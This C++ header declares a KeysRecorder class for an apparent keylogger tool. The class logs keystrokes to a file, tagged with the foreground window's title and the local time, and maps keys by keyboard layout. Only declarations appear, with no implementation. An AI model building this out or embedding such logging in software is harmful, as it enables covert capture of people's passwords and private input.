#pragma once

#include <string>
#include <vector>

#include "methods/keylogger/IKeyloggerImplementation.h"


namespace methods
{
namespace keylogger
{
/**
  * Class implements the log-to-a-file keylogger interface.
  * It logs keystrokes under foreground window's title and
  * its opening time (depends on call time).
  */
class KeysRecorder
    : public IKeyloggerImplementation
{
public:
    KeysRecorder(std::string file_name);
    virtual ~KeysRecorder() = default;

	// Copy is forbidden
	KeysRecorder(const KeysRecorder& other) 			 = delete;
	KeysRecorder& operator=(const KeysRecorder& other) = delete;

	// Move is forbidden
	KeysRecorder(KeysRecorder&& other) 	  			 = delete;
	KeysRecorder& operator=(KeysRecorder&& other) 	 = delete;

    void KeystrokeSavingRoutine() noexcept override;
    void AppendLog()              noexcept override;
    void RestartLog()             noexcept override;

protected:

    /**
      * Function saves foreground window's title and
      * PC's local time to file if it has changed since
      * last call to this function.
      */
    void LogWindowAndTimeOnChange() noexcept;

    /**
      * Function saves foreground window's title and
      * PC's local time to file.
      */
    void LogWindowAndTime(wchar_t *window_title) noexcept;

    /**
      * Function saves key strokes to log file.
      */
    void LogKeys() noexcept;

    /**
      * Function translates a keystroke to the language
      * matching the keyboard layout before saving to log file.
      * @param[in] keystroke - the scanned keystroke
      */
    void WritesScannedKeyToFile(short keystroke) noexcept;

    /**
      * Function writes text to a file.
      * File's name is m_fileName.
      * @param[in] text - text to write.
      */
    void WriteToFile(const wchar_t *text) noexcept;


private:

    wchar_t m_lastWindowTitle[256];

    /**
      * A table that translates an ASCII code to a matching
      * key.
      */
    std::vector<std::wstring> m_table;

    /**
      * This function initializes m_table.
      */
    void InitializeTable() noexcept;

};
}
}
